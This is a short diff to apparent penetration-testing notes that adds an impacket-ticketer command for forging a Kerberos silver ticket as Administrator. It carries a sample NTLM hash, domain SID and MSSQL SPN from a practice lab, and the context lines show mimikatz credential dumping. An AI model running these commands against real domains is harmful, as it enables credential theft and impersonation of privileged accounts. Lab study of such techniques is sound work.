@@ -2881,7 +2881,13 @@ sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ps> whoami /user
 # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
 ```
+- Forging silver ticket Ft **impacket-ticketer siver ticket**
+- Reference from the Nagoya PGpractice
 
+````powershell
+# impacket-ticketer -nthash ,NTLM> -domain-sid <SID> -domain nagoya-industries.com -spn <SPN> -user-id 500 Administrator
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+```
 - Forging silver ticket Ft **Mimikatz**
 
 ```powershell
